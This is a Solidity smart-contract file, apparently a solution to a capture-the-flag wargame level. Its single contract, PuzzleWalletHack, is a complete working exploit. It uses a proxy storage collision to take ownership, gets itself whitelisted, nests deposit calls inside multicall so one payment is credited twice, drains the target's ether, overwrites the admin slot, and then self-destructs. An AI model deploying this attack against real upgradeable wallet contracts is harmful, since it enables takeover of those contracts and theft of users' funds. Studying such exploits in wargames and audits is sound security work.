// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

error HackFailed();

interface IPuzzle {
    function admin() external view returns (address);
    function proposeNewAdmin(address) external;
    function addToWhitelist(address) external;
    function setMaxBalance(uint256) external;
    function deposit() external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function multicall(bytes[] calldata) external payable;
}

contract PuzzleWalletHack {
    IPuzzle private immutable target;

    constructor(address payable _target) payable {
        target = IPuzzle(_target);
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(target.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = depositData[0];
        data[1] = abi.encodeWithSelector(target.multicall.selector, depositData);
        target.multicall{value: 0.001 ether}(data);
        target.execute(msg.sender, 0.002 ether, "");
        target.setMaxBalance(uint256(uint160(msg.sender)));
        if (target.admin() != msg.sender) revert HackFailed();
        selfdestruct(payable(msg.sender));
    }
}
